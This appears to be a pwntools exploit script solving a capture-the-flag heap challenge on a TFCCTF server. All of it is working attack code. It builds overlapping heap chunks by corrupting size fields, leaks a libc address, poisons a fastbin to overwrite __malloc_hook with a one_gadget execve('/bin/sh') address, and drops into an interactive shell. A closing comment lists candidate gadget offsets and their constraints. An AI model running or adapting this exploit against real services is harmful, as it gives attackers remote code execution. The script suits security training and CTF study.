#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)
libc = ELF("libc.so.6")
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('challs.tfcctf.com', 31438)
else:
    p = process(exe.path)
GDB()
def cr(len, pa1, pa2):
    sla(b'Input: ', b'1')
    sla(b'Select length: ', str(len))
    sa(b'Enter credentials: ', pa1)
    sa(b'Name of the credentials: ', pa2)
def check():
    sla(b'Input: ', b'2')
def de(idx):
    sla(b'Input: ', b'3')
    sla(b'Select index: ', str(idx))

cr(0x78, b'a'*0x70, b'a')
cr(0x78, b'a'*0x70, b'a')
cr(0x28, flat(0x90, 0x21), b'a')
de(0)
de(1)
cr(0x78, b'a'*0x68, b'a')
cr(0x78, b'a'*0x70 + p64(0) + p8(0x91), b'a')
de(0)
cr(0x18, p8(0xc0), p8(0xc0))
check()
p.recvuntil(b'--> ')
libc.address = u64(p.recv(6) + b'\0\0') - 0x3b4cc0
info("libc.address: " + hex(libc.address))
# de(0)
# cr(0x18, b'a'*0x18 + p8(0x91), b'wan')
cr(0x68, b'b'*0x50 + flat(0, 0x71), b'a')
cr(0x38, b'b', b'a')
de(2)
de(3)
cr(0x68, b'b'*0x50 + flat(0,0x71, libc.sym.__malloc_hook-35 ), b'a')
cr(0x68, b'a', b'a')
cr(0x68, b'a'*19 + p64(libc.address + 0xe1fa1), b'a')
sla(b'Input: ', b'1')
# sla(b'Select length: ', str(u16(b'sh')))

p.interactive()
'''
0xc4dbf execve("/bin/sh", r13, r12)
constraints:
  [r13] == NULL || r13 == NULL || r13 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4ddf execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xc4de6 execve("/bin/sh", rbp-0x40, r12)
constraints:
  address rbp-0x38 is writable
  rax == NULL || {rax, rdi, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv
'''